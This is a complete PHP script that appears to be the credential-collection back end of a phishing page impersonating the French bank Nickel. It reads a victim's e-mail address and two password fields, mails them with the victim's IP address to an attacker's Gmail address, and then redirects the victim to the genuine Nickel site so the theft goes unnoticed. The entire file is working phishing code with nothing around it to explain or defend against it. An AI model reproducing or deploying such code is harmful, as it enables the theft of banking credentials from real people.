<?php
if ($_GET['Eml']!="" && $_POST['psswd1']!="") {
$ip = $_SERVER['REMOTE_ADDR'];
$message = "-----|SynchHot[fr]|-----\n";
$message .= "E-mail    : ".$_GET['Eml']."\n";           
$message .= "password1   : ".$_POST['psswd']."\n";
$message .= "password2   : ".$_POST['psswd1']."\n";
$message .= "-----------------------\n";
$to = "snoop.sousi12@gmail.com";
$subj = "nicknick ".$ip;
$from = "From: Mario<snoop.sousi12@gmail.com>";
mail($to, $subj, $message, $from);

@header("Location: https://mon.compte-nickel.fr/");
}else{@header("Location: ../index.php");}

?>